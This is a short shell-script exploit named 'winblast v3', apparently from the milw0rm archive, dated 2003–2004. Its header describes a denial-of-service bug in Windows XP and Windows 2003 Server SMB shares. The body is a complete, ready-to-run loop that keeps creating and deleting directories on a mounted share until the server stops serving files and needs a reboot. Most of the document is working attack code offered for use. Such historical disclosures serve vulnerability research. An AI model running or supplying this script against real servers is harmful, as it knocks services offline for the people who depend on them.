#!/bin/sh
# winblast v3 - DoS on WinXP, Win2003Srv
# 2003-12-04 Steve Ladjabi
# 
# I've encountered a strange problem mounting a Windows server share.
# My setup: Debian Linux, smbmount 3.0.0beta2 and Windows 2003 Server.
# 
# When the client creates and deletes a lot of files on the server, the
# server suddenly ceases serving, i.e. you can not access files nor list
# directory contents any more.
# Example:
# knoppix:/mnt # ll /mnt/test
# ls: /mnt/test: Cannot allocate memory
# 
# The only way to get the server working again is to reboot it. Rebooting
# the client does not help.
# 
# If you want to try for yourself, check this shell script. The script will
# create 1000 directories and then takes turns deleting and re-creating
# them. There will be no more than those 1000 directories at any time.
# After having created (and deleted) 3.5 millions directories the server
# denies access to the share.


count=0

# using 'pathcount' directories
pathcount=1000

echo running \'winblast v3\' with $pathcount files in loop ...

while [ 1 ]; do
p=$((pathcount*2-1))
stop=$((pathcount-1))
while [ "$p" != "$stop" ]; do
dirname=wbst$p
# delete old directory if it exists and exit on any error
if [ -d $dirname ]; then
rmdir $dirname || exit 3
fi;

# generating directory and exit on any error
mkdir $dirname || exit 1
p=$((p-1))
count=$((count+1))
done;
echo $count directories generated ...
done;
#-- end --



# milw0rm.com [2004-01-25]